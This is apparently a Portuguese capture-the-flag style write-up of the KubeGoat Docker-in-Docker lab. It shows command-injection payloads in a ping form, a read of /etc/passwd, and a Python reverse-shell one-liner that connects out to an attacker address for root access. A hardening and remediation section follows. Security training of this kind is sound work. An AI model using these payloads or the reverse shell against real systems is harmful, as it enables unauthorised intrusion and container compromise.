---
title: "DIND (docker-in-docker) exploitation"
summary: "Explora√ß√£o de falha de inje√ß√£o de comando (RCE) em servi√ßo de verifica√ß√£o de rede, resultando em acesso root ao container via Reverse Shell."
date: 2026-01-09
status: "conclu√≠do"
tags: ["kubernetes", "rce", "command-injection", "dind", "python-exploit"]
parent_path: "pesquisa/kubegoat"
tipo: "subpesquisa"
capa: "/images/subpesquisa/kubegoat/dind.png"
---

## Introdu√ß√£o

Nesta subpesquisa, analisamos o servi√ßo "DevSecOps Offensive Security", que oferece uma funcionalidade de teste de conectividade (Ping). A falta de sanitiza√ß√£o na entrada de dados permitiu a manipula√ß√£o do fluxo de execu√ß√£o do sistema operacional subjacente.

O objetivo foi transformar uma funcionalidade administrativa em um vetor de entrada para obter acesso total ao container, identificando posteriormente que se trata de um ambiente Docker-in-Docker (DIND), o que eleva a severidade do comprometimento.

## Objetivos

1.  Validar a valida√ß√£o de input do formul√°rio de teste de rede.
2.  Escalar de uma execu√ß√£o de comando simples para uma shell interativa.
3.  Estabelecer persist√™ncia ou acesso reverso (Reverse Shell).
4.  Identificar caracter√≠sticas do ambiente comprometido (DIND).

## Metodologia de Ataque (Red Team)

A explora√ß√£o seguiu o fluxo de identifica√ß√£o de **Command Injection**.

### 1. Reconhecimento e Teste de Inje√ß√£o

Inicialmente, o sistema foi testado com uma entrada esperada (`10.0.0.60`), retornando o resultado padr√£o do comando `ping`.

{{< img src="/images/subpesquisa/kubegoat/dind-1.png" alt="Teste inicial de ping com entrada v√°lida" class="evidencia" >}}

Em seguida, testamos a concatena√ß√£o de comandos utilizando o delimitador `;` (ponto e v√≠rgula), comum em sistemas Linux para execu√ß√£o sequencial.

**Payload de Teste:**
```text
127.0.0.1; ls -la
```

{{< img src="/images/subpesquisa/kubegoat/dind-2.png" alt="Command injection confirmado com ls -la" class="evidencia" >}}

**Resultado:** O sistema executou o ping e, em seguida, listou os arquivos do diret√≥rio atual (`main.go`, `go.mod`, `docker-entrypoint.sh`), confirmando a vulnerabilidade de **Remote Code Execution (RCE)**.

### 2. Enumera√ß√£o de Ambiente

Para entender o n√≠vel de privil√©gio e os usu√°rios do sistema, injetamos o comando de leitura de arquivos:
```text
127.0.0.1; cat /etc/passwd
```
{{< img src="/images/subpesquisa/kubegoat/dind-3.png" alt="Enumera√ß√£o de usu√°rios via /etc/passwd" class="evidencia" >}}
A sa√≠da exp√¥s a lista de usu√°rios, incluindo `root`, `daemon` e `app`.

### 3. Explora√ß√£o (Reverse Shell)

O objetivo final era obter uma shell interativa.

*   **Tentativa 1 (Netcat):** Tentamos usar `nc`, mas a ferramenta n√£o estava instalada no container.
*   **Tentativa 2 (Python):** Verificamos a exist√™ncia do interpretador Python com `127.0.0.1; which python3`, confirmando sua localiza√ß√£o em `/usr/bin/python3`.

{{< img src="/images/subpesquisa/kubegoat/dind-4.png" alt="Verifica√ß√£o da exist√™ncia do Python3" class="evidencia" >}}

**Execu√ß√£o do Exploit:**
Configuramos um listener na m√°quina atacante (`nc -lvnp 4444`) e injetamos um script Python *one-liner* para abrir um socket reverso:

```python
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.34",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 4. Resultado: Acesso Root Obtido

A conex√£o foi estabelecida com sucesso. Ao executar o comando `whoami`, confirmamos o acesso como usu√°rio **root**.

{{< img src="/images/subpesquisa/kubegoat/dind-6.png" alt="Reverse shell estabelecida com acesso root" class="evidencia" >}}

A an√°lise posterior do ambiente revelou a presen√ßa de `/custom/containerd/containerd.sock`, confirmando que este container possui acesso ao daemon do Docker (Docker-in-Docker), abrindo portas para ataques de *Container Breakout*.

## üõ° An√°lise de Impacto e Mitiga√ß√£o (Blue Team)

A vulnerabilidade √© classificada como **Cr√≠tica**. O c√≥digo da aplica√ß√£o provavelmente utiliza uma chamada de sistema insegura, como `exec(f"ping {ip}")`, passando a string bruta do usu√°rio direto para o kernel.

### Como Corrigir (Remedia√ß√£o no C√≥digo)

1. **Evite Shell Execution:** Nunca utilize fun√ß√µes como `os.system()`, `exec()`, ou `shell_exec()` com input de usu√°rio.
2. **Use Bibliotecas Seguras:** Utilize bibliotecas que separam o comando dos argumentos.
   * *Inseguro (Python):* `os.system("ping " + user_input)`
   * *Seguro (Python):*
```python
import subprocess
# O par√¢metro shell=False impede a inje√ß√£o de operadores como ";" ou "&&"
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

3. **Sanitiza√ß√£o Rigorosa:** Se o input deve ser um IP, valide se ele corresponde estritamente ao formato de um endere√ßo IP (Regex) antes de processar.

### Como Prevenir (Hardening do Container)

Mesmo que a aplica√ß√£o falhe, a infraestrutura deve conter o dano:

* **Imagens Distroless:** O ataque dependeu da exist√™ncia de `python3` e `/bin/sh` no container. O uso de imagens "Distroless" ou m√≠nimas (scratch) removeria essas ferramentas, quebrando a *Kill Chain* do atacante.
* **Execute como Non-Root:** O atacante ganhou acesso imediato como `root`. Configure o `Dockerfile` ou o `SecurityContext` do Kubernetes para rodar a aplica√ß√£o como um usu√°rio sem privil√©gios (`runAsUser: 1000`).
* **Read-Only Root Filesystem:** For√ßar o sistema de arquivos como somente leitura impede que o atacante baixe ou crie scripts maliciosos no disco.
* **Network Policies:** Implemente pol√≠ticas de rede para bloquear conex√µes de sa√≠da n√£o autorizadas, dificultando o estabelecimento de reverse shells.

## üìä Conclus√£o

Esta subpesquisa demonstrou como uma vulnerabilidade aparentemente simples de Command Injection pode escalar rapidamente para um comprometimento total do container com privil√©gios root. A presen√ßa do ambiente Docker-in-Docker amplifica significativamente o risco, permitindo potenciais ataques de container breakout.

A combina√ß√£o de valida√ß√£o rigorosa de entrada, princ√≠pio do menor privil√©gio e hardening de container √© essencial para mitigar essa classe de vulnerabilidades em ambientes Kubernetes.